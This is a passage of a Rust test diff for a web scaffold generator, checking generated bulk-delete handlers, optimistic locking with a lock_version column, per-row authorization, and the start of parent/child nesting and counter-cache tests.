+        assert!(routes.contains("pub async fn bulk_delete("), "{routes}");
+    }
+
+    #[test]
+    fn bulk_delete_body_extractor_is_last() {
+        let routes = bulk_routes_default();
+        let bulk = handler_slice(&routes, "bulk_delete");
+        // Parameter list: everything up to the closing `)` of the signature.
+        let Some((params, _)) = bulk.split_once("\n)") else {
+            panic!("bulk_delete must have a parameter list:\n{bulk}");
+        };
+        assert!(params.contains("flash: Flash,"), "{params}");
+        let last = params
+            .lines()
+            .map(str::trim)
+            .rfind(|l| !l.is_empty())
+            .unwrap_or_else(|| panic!("bulk_delete must take parameters:\n{params}"));
+        // axum requires the body-consuming extractor to be the final argument.
+        assert!(
+            last.starts_with("body:") && last.contains("Bytes"),
+            "the Bytes body extractor must be the last parameter, got `{last}`:\n{params}"
+        );
+    }
+
+    #[test]
+    fn bulk_delete_calls_delete_many() {
+        let routes = bulk_routes_default();
+        let bulk = handler_slice(&routes, "bulk_delete");
+        assert!(bulk.contains(".delete_many(&"), "{bulk}");
+        assert!(
+            !bulk.contains("diesel::delete"),
+            "bulk delete must route through the repository, not a raw diesel::delete: {bulk}"
+        );
+        assert!(
+            !bulk.contains("deleted_at.eq("),
+            "bulk delete must not hand-roll the soft-delete update: {bulk}"
+        );
+    }
+
+    /// The handler must not hold the extracted `Db` across `delete_many`,
+    /// which checks out a *second* connection from the same primary pool.
+    /// Holding both stalls every bulk delete on a pool of one and deadlocks
+    /// larger pools once enough requests are in the handler together.
+    #[test]
+    fn bulk_delete_releases_db_before_delete_many() {
+        let owner_scoped = {
+            // An owner column (`user_id`) turns on the policy/authorize wiring,
+            // which adds work between the load and the delete.
+            let tmp = project_with_main(default_main());
+            let plan = plan_scaffold(
+                tmp.path(),
+                "Post",
+                &["title:String".into(), "user_id:i64".into()],
+                "20260427000000",
+            )
+            .unwrap();
+            action_contents(&plan, "src/routes/posts.rs")
+        };
+        let soft_deleted = bulk_routes(&ScaffoldOptions {
+            model: ModelOptions {
+                soft_delete: true,
+                ..Default::default()
+            },
+            ..Default::default()
+        });
+        for routes in [bulk_routes_default(), owner_scoped, soft_deleted] {
+            let bulk = handler_slice(&routes, "bulk_delete");
+            let drop_at = bulk
+                .find("drop(db);")
+                .unwrap_or_else(|| panic!("bulk delete must release its Db:\n{bulk}"));
+            let load_at = bulk
+                .find(".load(&mut *db)")
+                .unwrap_or_else(|| panic!("bulk delete must load the rows:\n{bulk}"));
+            let delete_at = bulk
+                .find(".delete_many(&")
+                .unwrap_or_else(|| panic!("bulk delete must call delete_many:\n{bulk}"));
+            assert!(
+                load_at < drop_at && drop_at < delete_at,
+                "the Db must be dropped after the load and before delete_many:\n{bulk}"
+            );
+        }
+    }
+
+    #[test]
+    fn bulk_delete_never_returns_bad_request() {
+        let routes = bulk_routes_default();
+        let bulk = handler_slice(&routes, "bulk_delete");
+        assert!(
+            !bulk.contains("bad_request"),
+            "an empty or malformed selection must never 400: {bulk}"
+        );
+        assert!(
+            !bulk.contains("StatusCode::BAD_REQUEST"),
+            "an empty or malformed selection must never 400: {bulk}"
+        );
+    }
+
+    #[test]
+    fn bulk_delete_empty_selection_redirects_without_deleting() {
+        let routes = bulk_routes_default();
+        let bulk = handler_slice(&routes, "bulk_delete");
+        assert!(bulk.contains("is_empty()"), "{bulk}");
+        let redirect_at = bulk
+            .find("Redirect::to(&paths::index())")
+            .unwrap_or_else(|| panic!("empty selection must redirect to the index:\n{bulk}"));
+        let delete_at = bulk
+            .find(".delete_many(&")
+            .unwrap_or_else(|| panic!("bulk delete must call delete_many:\n{bulk}"));
+        assert!(
+            redirect_at < delete_at,
+            "the empty-selection early return must precede the delete:\n{bulk}"
+        );
+    }
+
+    #[test]
+    fn bulk_ids_parser_accepts_bracket_form() {
+        let routes = bulk_routes_default();
+        assert!(routes.contains("fn parse_bulk_ids("), "{routes}");
+        let Some((_, rest)) = routes.split_once("fn parse_bulk_ids(") else {
+            panic!("routes must emit a parse_bulk_ids helper:\n{routes}");
+        };
+        let parser = rest.split("\npub ").next().unwrap_or(rest);
+        assert!(parser.contains("url::form_urlencoded::parse"), "{parser}");
+        assert!(parser.contains("\"ids\""), "{parser}");
+        assert!(parser.contains("\"ids[]\""), "{parser}");
+        assert!(
+            parser.contains("seen.insert("),
+            "the parser must dedupe selected ids: {parser}"
+        );
+    }
+
+    /// The parser reads the raw body, not a page-sized selection, so a crafted
+    /// POST can carry as many distinct ids as the body limit allows. Dedup must
+    /// stay O(1) per value — a `Vec::contains` scan would make it Θ(n²) and let
+    /// a small request burn real CPU before the handler reaches the database.
+    #[test]
+    fn bulk_ids_parser_dedupes_in_linear_time() {
+        let routes = bulk_routes_default();
+        let Some((_, rest)) = routes.split_once("fn parse_bulk_ids(") else {
+            panic!("routes must emit a parse_bulk_ids helper:\n{routes}");
+        };
+        let parser = rest.split("\npub ").next().unwrap_or(rest);
+        assert!(
+            parser.contains("HashSet"),
+            "dedup must go through a hash set, not a linear scan: {parser}"
+        );
+        assert!(
+            !parser.contains("ids.contains(&"),
+            "a per-value Vec::contains scan makes parsing quadratic: {parser}"
+        );
+    }
+
+    #[test]
+    fn bulk_delete_authorizes_each_selected_row() {
+        // An owner column (`user_id`) turns on the policy/authorize wiring.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "user_id:i64".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        let bulk = handler_slice(&routes, "bulk_delete");
+        assert!(
+            bulk.contains("for "),
+            "authorization must run per row: {bulk}"
+        );
+        assert!(bulk.contains("authorize::<Post>("), "{bulk}");
+        assert!(bulk.contains("\"delete\""), "{bulk}");
+    }
+
+    #[test]
+    fn bulk_delete_soft_delete_filters_already_deleted() {
+        let routes = bulk_routes(&ScaffoldOptions {
+            model: ModelOptions {
+                soft_delete: true,
+                ..Default::default()
+            },
+            ..Default::default()
+        });
+        let bulk = handler_slice(&routes, "bulk_delete");
+        assert!(
+            bulk.contains("deleted_at.is_null()"),
+            "the soft-delete SELECT must skip already-deleted rows: {bulk}"
+        );
+    }
+
+    #[test]
+    fn bulk_delete_omitted_for_live_variant() {
+        let routes = bulk_routes(&ScaffoldOptions {
+            live: true,
+            ..Default::default()
+        });
+        assert!(!routes.contains("bulk_delete"), "{routes}");
+        assert!(!routes.contains("bulk_actions_form"), "{routes}");
+    }
+
+    #[test]
+    fn bulk_delete_omitted_for_live_validation_variant() {
+        let routes = bulk_routes(&ScaffoldOptions {
+            live_validation: true,
+            ..Default::default()
+        });
+        assert!(!routes.contains("bulk_delete"), "{routes}");
+        assert!(!routes.contains("bulk_actions_form"), "{routes}");
+    }
+
+    #[test]
+    fn bulk_delete_omitted_for_sharded_variant() {
+        let routes = bulk_routes(&ScaffoldOptions {
+            model: ModelOptions {
+                sharded: true,
+                shard_key: Some("title".to_owned()),
+                ..Default::default()
+            },
+            ..Default::default()
+        });
+        assert!(!routes.contains("bulk_delete"), "{routes}");
+        assert!(!routes.contains("bulk_actions_form"), "{routes}");
+    }
+
+    #[test]
+    fn paths_macro_includes_bulk_delete() {
+        let routes = bulk_routes_default();
+        let Some((paths_block, _)) = routes
+            .split_once("autumn_web::paths![")
+            .and_then(|(_, rest)| rest.split_once("];"))
+        else {
+            panic!("routes must emit an autumn_web::paths! block:\n{routes}");
+        };
+        assert!(
+            paths_block.contains("bulk_delete"),
+            "paths! must export bulk_delete so paths::bulk_delete() resolves: {paths_block}"
+        );
+    }
+
+    #[test]
+    fn main_rs_registers_bulk_delete_after_destroy() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(tmp.path(), "Post", &bulk_fields(), "20260427000000").unwrap();
+        let main = action_contents(&plan, "src/main.rs");
+        assert!(main.contains("routes::posts::bulk_delete"), "{main}");
+        let destroy_at = main
+            .find("routes::posts::destroy")
+            .unwrap_or_else(|| panic!("main.rs must mount destroy:\n{main}"));
+        let bulk_at = main
+            .find("routes::posts::bulk_delete")
+            .unwrap_or_else(|| panic!("main.rs must mount bulk_delete:\n{main}"));
+        assert!(
+            destroy_at < bulk_at,
+            "bulk_delete must be registered immediately after destroy:\n{main}"
+        );
+    }
+
+    #[test]
+    fn write_path_test_covers_bulk_delete() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(tmp.path(), "Post", &bulk_fields(), "20260427000000").unwrap();
+        let test_file = action_contents(&plan, "tests/post.rs");
+        assert!(test_file.contains("/posts/bulk_delete"), "{test_file}");
+        assert!(test_file.contains("ids=1&ids=2"), "{test_file}");
+        assert!(
+            test_file.contains("0 row(s)"),
+            "the bulk delete must be observed to remove both rows: {test_file}"
+        );
+        // The empty-selection case is a 303 no-op, not a 400.
+        let Some((_, bulk_section)) = test_file.split_once("/posts/bulk_delete") else {
+            panic!("write-path test must exercise bulk_delete:\n{test_file}");
+        };
+        assert!(
+            bulk_section.contains(".form(\"\")") || bulk_section.contains("ids="),
+            "an empty-ids POST must be exercised: {bulk_section}"
+        );
+        assert!(
+            bulk_section.contains("assert_status(303)"),
+            "the empty-ids POST must still redirect with 303: {bulk_section}"
+        );
+        assert!(
+            !bulk_section.contains("assert_status(400)"),
+            "an empty selection must never 400: {bulk_section}"
+        );
+    }
+
+    #[test]
+    fn live_scaffold_output_contains_no_bulk_artifacts() {
+        let routes = bulk_routes(&ScaffoldOptions {
+            live: true,
+            ..Default::default()
+        });
+        for needle in ["bulk", "bulk_actions", "ids[]"] {
+            assert!(
+                !routes.contains(needle),
+                "the --live scaffold must carry no `{needle}` artifact: {routes}"
+            );
+        }
+    }
+
+    // ── optimistic locking on the edit form (issue #1318) ───────────────────
+    //
+    // A scaffold whose field set declares `lock_version` must carry the version
+    // through the edit form and guard the UPDATE with it, so two concurrent
+    // editors get a 409 re-render instead of silently clobbering each other.
+
+    /// A slug column token, held in a const so its `{from:title}` braces never
+    /// sit inside a macro invocation (clippy reads them as a format argument).
+    const SLUG_COL: &str = "slug:slug{from:title}";
+
+    /// The `Post` scaffold field list with a `lock_version` column.
+    fn lock_fields() -> Vec<String> {
+        vec!["title:String".into(), "lock_version:i32".into()]
+    }
+
+    fn lock_plan(options: &ScaffoldOptions) -> Result<Plan, GenerateError> {
+        let tmp = project_with_main(default_main());
+        // The TempDir must outlive the plan's file reads, which all happen
+        // during planning — `action_contents` reads from the in-memory plan.
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &lock_fields(),
+            "20260427000000",
+            options,
+        );
+        drop(tmp);
+        plan
+    }
+
+    /// The routes source of a default `Post` scaffold carrying `lock_version`.
+    fn lock_routes() -> String {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &lock_fields(),
+            "20260427000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap();
+        action_contents(&plan, "src/routes/posts.rs")
+    }
+
+    #[test]
+    fn lock_version_edit_form_renders_hidden_version_input() {
+        // AC 1: the edit form carries the row's current `lock_version` as a
+        // hidden input so the submit says which version the user was editing.
+        let routes = lock_routes();
+        assert!(
+            routes.contains("name=\"lock_version\""),
+            "edit form must render a hidden lock_version input: {routes}"
+        );
+        let edit = handler_slice(&routes, "edit_form");
+        assert!(
+            edit.contains("row.lock_version"),
+            "edit_form must seed the hidden input from the loaded row: {edit}"
+        );
+        // The create form must NOT carry it: a new row has no version yet.
+        let new_form = handler_slice(&routes, "new_form");
+        assert!(
+            !new_form.contains("lock_version"),
+            "new_form must not carry a lock_version: {new_form}"
+        );
+    }
+
+    #[test]
+    fn lock_version_is_excluded_from_the_editable_form_struct() {
+        // The version is machinery, not content: it must not surface as a
+        // "Lock version" text box, and it must not be settable from user input
+        // through the ordinary column path.
+        let routes = lock_routes();
+        assert!(
+            !routes.contains("pub lock_version: i32,\n}"),
+            "lock_version must not be a PostForm column: {routes}"
+        );
+        assert!(
+            !routes.contains("posts::lock_version.eq(new.lock_version"),
+            "lock_version must not be set from the submitted form value: {routes}"
+        );
+    }
+
+    #[test]
+    fn lock_version_update_guards_the_write_and_bumps_the_version() {
+        // AC 2 + AC 4: the UPDATE carries a `WHERE lock_version = $expected`
+        // guard and increments the column in the same statement, so the check
+        // and the bump are atomic.
+        let routes = lock_routes();
+        let update = handler_slice(&routes, "update");
+        assert!(
+            update.contains("posts::lock_version.eq(expected_lock_version)"),
+            "the UPDATE must be guarded by the expected version: {update}"
+        );
+        assert!(
+            update.contains("posts::lock_version.eq(posts::lock_version + 1)"),
+            "a successful UPDATE must increment the version: {update}"
+        );
+        assert!(
+            routes.contains("fn parse_lock_version("),
+            "the routes file must parse the submitted version out of the body: {routes}"
+        );
+    }
+
+    #[test]
+    fn lock_version_parser_survives_a_colliding_security_field_name() {
+        // The CSRF and submit-token field names are app-configurable, so an app
+        // may legitimately name one of them `lock_version` — and those hidden
+        // inputs are prepended, landing in the body BEFORE the real version.
+        // Taking the first `lock_version` pair would read a UUID, fail to parse
+        // it, and 400 every update. The parser scans for the first pair that
+        // parses instead.
+        let routes = lock_routes();
+        assert!(
+            routes.contains(".filter(|(key, _)| key == \"lock_version\")")
+                && routes.contains(".find_map(|(_, value)| value.parse::<i32>().ok())"),
+            "the parser must scan every lock_version pair, not stop at the first: {routes}"
+        );
+        assert!(
+            !routes.contains(".find(|(key, _)| key == \"lock_version\")"),
+            "a first-match-wins parse is the collision bug: {routes}"
+        );
+    }
+
+    #[test]
+    fn lock_version_conflict_rerenders_the_edit_form_at_409() {
+        // AC 3: a stale submit is not a dead-end error page — it re-renders the
+        // edit form at 409 with the submitted values and an inline banner, and
+        // it is distinguished from a genuinely missing row (404).
+        let routes = lock_routes();
+        let update = handler_slice(&routes, "update");
+        assert!(
+            update.contains("StatusCode::CONFLICT"),
+            "a stale submit must respond 409: {update}"
+        );
+        assert!(
+            update.contains("lock_conflict"),
+            "the 409 branch must flag the shared edit body to show the banner: {update}"
+        );
+        assert!(
+            update.contains("not_found_msg"),
+            "a genuinely missing row must still be a 404, not a 409: {update}"
+        );
+        assert!(
+            routes.contains("changed by someone else"),
+            "the re-rendered form must carry an inline conflict banner: {routes}"
+        );
+        assert!(
+            routes.contains("role=\"alert\""),
+            "the banner must be announced to assistive tech: {routes}"
+        );
+    }
+
+    #[test]
+    fn a_re_read_row_is_re_authorized_before_it_is_used() {
+        // Both guarded writes re-read the row when they match zero. The policy
+        // check earlier in each handler ran against the snapshot that request
+        // loaded — and a record policy can depend on mutable row data (the
+        // generated owner policy does), so the very write that moved the version
+        // may also have moved the row out of this actor's reach. Rendering or
+        // reading the re-read row unchecked would leak it.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "user:references".into(),
+                "status:String:states(draft->published)".into(),
+                "lock_version:i32".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        let needle = "authorize::<Post>(&state, &session, \"update\", &current)";
+
+        // The transition path renders the whole row, so this is the sharp case.
+        let transition = handler_slice(&routes, "transition_status");
+        let conflict_at = transition
+            .find("if updated == 0")
+            .expect("transition conflict branch");
+        assert!(
+            transition[conflict_at..].contains(needle),
+            "the transition 409 must re-authorize before rendering: {transition}"
+        );
+        let reauthz_at = conflict_at + transition[conflict_at..].find(needle).unwrap();
+        let render_at = transition[conflict_at..]
+            .find("show_view(")
+            .map(|i| conflict_at + i)
+            .expect("show_view in the conflict branch");
+        assert!(
+            reauthz_at < render_at,
+            "the check must come BEFORE the render: {transition}"
+        );
+
+        // The update path only carries the version integer across, but re-checks
+        // for the same reason rather than arguing about how sensitive it is.
+        let update = handler_slice(&routes, "update");
+        let uconflict = update
+            .find("if updated == 0")
+            .expect("update conflict branch");
+        assert!(
+            update[uconflict..].contains(needle),
+            "the update 409 must re-authorize the re-read row: {update}"
+        );
+    }
+
+    #[test]
+    fn a_no_policy_scaffold_emits_no_conflict_reauthorization() {
+        // Nothing to re-check without a policy, and the emitted branch must not
+        // reference a `state`/`session` the handler never took.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &lock_fields(),
+            "20260427000000",
+            &ScaffoldOptions {
+                no_policy: true,
+                ..Default::default()
+            },
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            !routes.contains("authorize::<Post>"),
+            "a --no-policy scaffold must emit no authorize calls: {routes}"
+        );
+        assert!(
+            handler_slice(&routes, "update").contains("StatusCode::CONFLICT"),
+            "the 409 branch is still emitted: {routes}"
+        );
+    }
+
+    #[test]
+    fn lock_version_conflict_rerender_carries_the_fresh_version() {
+        // Re-rendering with the STALE version would make the form unsavable
+        // forever: the user would resubmit the same losing version and conflict
+        // again. The 409 body carries the row's current version so a second
+        // Save applies the user's values on top of the newer row.
+        let routes = lock_routes();
+        let update = handler_slice(&routes, "update");
+        assert!(
+            update.contains("let lock_version_value = current.lock_version;"),
+            "the 409 re-render must carry the freshly-read version: {update}"
+        );
+    }
+
+    #[test]
+    fn lock_version_scaffold_emits_a_stale_write_smoke_test() {
+        // AC 6: the generated suite proves the contract — a stale submit yields
+        // a 409 re-render and leaves the row untouched; a fresh submit succeeds
+        // and bumps the version.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &lock_fields(),
+            "20260427000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap();
+        let test_file = action_contents(&plan, "tests/post.rs");
+        assert!(
+            test_file.contains("async fn posts_optimistic_lock_conflict()"),
+            "an optimistic-lock write-path test must be emitted: {test_file}"
+        );
+        assert!(
+            test_file.contains("assert_status(409)"),
+            "the stale submit must assert a 409: {test_file}"
+        );
+        assert!(
+            test_file.contains("assert_status(303)"),
+            "the fresh submit must still redirect: {test_file}"
+        );
+    }
+
+    #[test]
+    fn scaffold_without_lock_version_carries_no_locking_artifacts() {
+        // AC 5: zero behavior change for the overwhelming common case.
+        let routes = bulk_routes_default();
+        for needle in [
+            "lock_version",
+            "lock_conflict",
+            "CONFLICT",
+            "changed by someone else",
+        ] {
+            assert!(
+                !routes.contains(needle),
+                "a scaffold with no lock_version column must carry no `{needle}`: {routes}"
+            );
+        }
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let test_file = action_contents(&plan, "tests/post.rs");
+        assert!(
+            !test_file.contains("lock_version"),
+            "the generated test suite must carry no locking artifacts: {test_file}"
+        );
+    }
+
+    #[test]
+    fn lock_version_is_refused_on_variants_whose_update_path_is_not_wired() {
+        // `--live`/`--sharded` write through the repository extractor and the
+        // attachment path writes after a multipart save; neither routes through
+        // the guarded statement, so generating them would emit silently lossy
+        // code. Refuse up front instead (same posture as the `slug` gates).
+        for (label, options) in [
+            (
+                "--live",
+                ScaffoldOptions {
+                    live: true,
+                    ..Default::default()
+                },
+            ),
+            (
+                "--sharded",
+                ScaffoldOptions {
+                    model: ModelOptions {
+                        sharded: true,
+                        shard_key: Some("title".into()),
+                        ..Default::default()
+                    },
+                    ..Default::default()
+                },
+            ),
+        ] {
+            let err = lock_plan(&options).expect_err("{label} + lock_version must be refused");
+            let msg = format!("{err}");
+            assert!(
+                msg.contains("lock_version"),
+                "the {label} refusal must name lock_version: {msg}"
+            );
+        }
+    }
+
+    #[test]
+    fn api_scaffolds_are_exempt_from_every_variant_gate() {
+        // `--api` emits no routes file, so none of the HTML-surface variants
+        // can be inconsistent with a guarded update that does not exist. These
+        // combinations generated fine before #1318 and must keep doing so; the
+        // model attribute still lands, which is what conflict-checks the JSON
+        // update. (`--api` is NOT exempt from the empty-insert-struct guard —
+        // that one is about `New{Model}`, which every variant emits.)
+        for (label, cols, options) in [
+            (
+                "--api --live",
+                vec!["title:String".to_owned(), "lock_version:i32".to_owned()],
+                ScaffoldOptions {
+                    api: true,
+                    live: true,
+                    ..Default::default()
+                },
+            ),
+            (
+                "--api --sharded",
+                vec!["title:String".to_owned(), "lock_version:i32".to_owned()],
+                ScaffoldOptions {
+                    api: true,
+                    model: ModelOptions {
+                        sharded: true,
+                        shard_key: Some("title".to_owned()),
+                        ..Default::default()
+                    },
+                    ..Default::default()
+                },
+            ),
+            (
+                "--api + attachment",
+                vec![
+                    "title:String".to_owned(),
+                    "cover:Attachment".to_owned(),
+                    "lock_version:i32".to_owned(),
+                ],
+                ScaffoldOptions {
+                    api: true,
+                    ..Default::default()
+                },
+            ),
+        ] {
+            let tmp = project_with_main(default_main());
+            let plan =
+                plan_scaffold_with_options(tmp.path(), "Post", &cols, "20260427000000", &options);
+            assert!(
+                plan.is_ok(),
+                "{label} + lock_version must still generate: {:?}",
+                plan.err()
+            );
+        }
+    }
+
+    #[test]
+    fn destroying_a_legacy_lock_version_scaffold_is_never_blocked_by_the_new_gates() {
+        // A scaffold generated before these refusals existed must stay
+        // removable. `destroy` recomputes the plan it is about to revert, so a
+        // refusal here lands BEFORE `Plan::revert` sees `--force` — stranding
+        // exactly the files the user asked to delete, with no way out.
+        for (label, cols, options) in [
+            (
+                "--live",
+                lock_fields(),
+                ScaffoldOptions {
+                    live: true,
+                    ..Default::default()
+                },
+            ),
+            (
+                "--sharded",
+                lock_fields(),
+                ScaffoldOptions {
+                    model: ModelOptions {
+                        sharded: true,
+                        shard_key: Some("title".to_owned()),
+                        ..Default::default()
+                    },
+                    ..Default::default()
+                },
+            ),
+            (
+                "slug",
+                vec![
+                    "title:String".to_owned(),
+                    SLUG_COL.to_owned(),
+                    "lock_version:i32".to_owned(),
+                ],
+                ScaffoldOptions::default(),
+            ),
+            (
+                "attachment",
+                vec![
+                    "title:String".to_owned(),
+                    "cover:Attachment".to_owned(),
+                    "lock_version:i32".to_owned(),
+                ],
+                ScaffoldOptions::default(),
+            ),
+        ] {
+            let tmp = project_with_main(default_main());
+            let plan = plan_scaffold_with_options_for_revert(
+                tmp.path(),
+                "Post",
+                &cols,
+                "20260427000000",
+                &options,
+            );
+            assert!(
+                plan.is_ok(),
+                "destroying a legacy {label} + lock_version scaffold must plan: {:?}",
+                plan.err()
+            );
+        }
+    }
+
+    #[test]
+    fn lock_version_is_refused_alongside_a_slug_column() {
+        // A slug scaffold keys `update` off the slug, not the primary key, so
+        // `WHERE slug = ... AND lock_version = ...` does not identify a stable
+        // row: rename a slug, let a new row (version 0) claim the freed value,
+        // and a stale submit would commit over that unrelated record while
+        // reporting success. Refuse the pair rather than ship the swap.
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "slug:slug{from:title}".into(),
+                "lock_version:i32".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(
+            msg.contains("lock_version") && msg.contains("slug"),
+            "the refusal must name both columns: {msg}"
+        );
+    }
+
+    #[test]
+    fn lock_version_scaffold_with_no_insertable_columns_is_refused() {
+        // Counting declared tokens would miss this: two columns are declared,
+        // but `--default` drops `title` from the insert struct and
+        // `#[lock_version]` drops the version, leaving `NewPost` empty — which
+        // does not implement `Insertable` and would not compile.
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "lock_version:i32".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    defaults: vec!["title=x".into()],
+                    ..Default::default()
+                },
+                ..Default::default()
+            },
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(
+            msg.contains("no insertable columns") && msg.contains("NewPost"),
+            "got: {msg}"
+        );
+    }
+
+    #[test]
+    fn lock_version_cannot_be_the_only_column() {
+        // The column is DB-managed, so it contributes no form field — a
+        // scaffold declaring only `lock_version` would emit an empty
+        // `NewPost`, which is not `Insertable` and does not compile.
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["lock_version:i32".into()],
+            "20260427000000",
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(
+            msg.contains("no insertable columns") && msg.contains("NewPost"),
+            "the refusal must explain why one column is not enough: {msg}"
+        );
+    }
+
+    #[test]
+    fn state_transition_is_a_compare_and_swap_on_the_version() {
+        // A transition is a read-modify-write: it loads the row, checks the edge
+        // is legal from the state it read, then writes. Without a guard, two
+        // concurrent transitions out of the same source state both pass the
+        // check and both commit — the second silently overwriting the first.
+        // The bump alone does not prevent that; the WHERE does.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "status:String:states(draft->published)".into(),
+                "lock_version:i32".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        let transition = handler_slice(&routes, "transition_status");
+        assert!(
+            transition.contains(".filter(posts::lock_version.eq(row.lock_version))"),
+            "the transition write must be guarded by the version it read: {transition}"
+        );
+        assert!(
+            transition.contains("if updated == 0") && transition.contains("StatusCode::CONFLICT"),
+            "a lost transition race must 409, not report success: {transition}"
+        );
+        assert!(
+            transition.contains("changed by someone else"),
+            "the 409 must explain itself: {transition}"
+        );
+        // Zero rows is ambiguous: the version moved, or the row was deleted
+        // between the load and the write. The transition path re-reads to tell
+        // them apart, exactly as `update` does — otherwise a concurrent delete
+        // renders a conflict page for a row that can no longer be reloaded.
+        assert!(
+            transition.contains(".optional()?") && transition.contains("not_found_msg"),
+            "a concurrent delete must 404, not 409: {transition}"
+        );
+        // And the 409 shows the row as it now stands, not this request's stale
+        // snapshot — the legal transitions may have changed.
+        assert!(
+            transition.contains("&current,"),
+            "the 409 must render the re-read row: {transition}"
+        );
+    }
+
+    #[test]
+    fn state_transition_bumps_the_lock_version() {
+        // The bump is the other half: it makes the transition visible to anyone
+        // else guarding on the version, so an author whose edit form predates
+        // the transition is told the record moved on instead of saving over it.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "status:String:states(draft->published)".into(),
+                "lock_version:i32".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        let transition = handler_slice(&routes, "transition_status");
+        assert!(
+            transition.contains("posts::lock_version.eq(posts::lock_version + 1)"),
+            "the transition write must bump the version: {transition}"
+        );
+    }
+
+    #[test]
+    fn lock_version_hidden_input_is_prepended_after_the_submit_token() {
+        // `prepend` renders in call order, and `SubmitTokenLayer` only scans the
+        // body's first chunk (issue #1360) — so the token must still be the
+        // first field, with the version input behind it.
+        let routes = lock_routes();
+        let token_at = routes
+            .find("form = form.prepend(submit_token_input(")
+            .expect("submit token prepend");
+        let lock_at = routes
+            .find("input type=\"hidden\" name=\"lock_version\" value=(version);")
+            .expect("lock version prepend");
+        assert!(
+            token_at < lock_at,
+            "the submit token must be prepended before the lock version:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn lock_version_is_refused_alongside_attachment_fields() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "cover:attachment".into(),
+                "lock_version:i32".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("lock_version"), "got: {msg}");
+    }
+
+    // ── `--belongs-to` parent/child nesting (issue #1323) ──────────────────
+
+    /// A project whose `Post` parent has already been scaffolded, so
+    /// `src/routes/posts.rs` exists for the child's `--belongs-to` injection.
+    /// Returns the temp project plus the parent plan (already executed on disk).
+    fn project_with_scaffolded_parent() -> TempDir {
+        let tmp = project_with_main(default_main());
+        fs::write(
+            tmp.path().join("Cargo.toml"),
+            "[package]\nname = \"x\"\n\n\
+             [dependencies]\n\
+             autumn-web = \"0.6.0\"\n\
+             maud = { version = \"0.27\", features = [\"axum\"] }\n\
+             diesel_migrations = \"2\"\n\n\
+             [dev-dependencies]\n\
+             tokio = { version = \"1\", features = [\"rt\", \"macros\"] }\n",
+        )
+        .unwrap();
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+        tmp
+    }
+
+    fn belongs_to_options() -> ScaffoldOptions {
+        ScaffoldOptions {
+            belongs_to: Some("Post".to_owned()),
+            ..ScaffoldOptions::default()
+        }
+    }
+
+    /// Plan a `Comment body:Text post:references --belongs-to Post` scaffold
+    /// against a project whose `Post` parent is already scaffolded.
+    fn nested_comment_plan(tmp: &TempDir) -> Plan {
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap()
+    }
+
+    // ── #1325 `--counter-cache` ───────────────────────────────────────────
+
+    fn counter_cache_options() -> ScaffoldOptions {
+        ScaffoldOptions {
+            counter_cache: true,
+            ..belongs_to_options()
+        }
+    }
+
+    fn counter_cached_comment_plan(tmp: &TempDir) -> Plan {
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &counter_cache_options(),
+        )
+        .unwrap()
+    }
+
+    #[test]
+    fn counter_cache_emits_a_not_null_zero_default_column_on_the_parent() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = counter_cached_comment_plan(&tmp);
+        let up = action_contents(
+            &plan,
+            "migrations/202604280000001_add_comment_count_to_posts/up.sql",
+        );
+        assert!(
